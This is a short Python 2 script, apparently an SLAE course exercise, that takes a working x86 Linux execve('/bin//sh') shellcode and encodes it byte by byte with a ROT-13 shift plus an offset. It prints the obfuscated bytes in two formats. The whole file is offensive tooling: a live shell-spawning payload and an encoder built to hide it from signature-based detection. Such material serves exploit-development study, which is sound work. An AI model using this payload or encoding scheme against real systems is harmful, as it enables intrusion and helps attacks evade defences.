#!/usr/bin/python
# Filename: encoder.py
# Author: SLAE-14209

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

rot = 13

encoded = ""
encoded2 = ""

for i in bytearray(shellcode): 
   y = (i + rot)%256 
   z = y + 11
   encoded += '\\x'
   encoded += '%02x' %z 
   encoded2 += '0x' 
   encoded2 += '%02x,' %z
   
print encoded
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
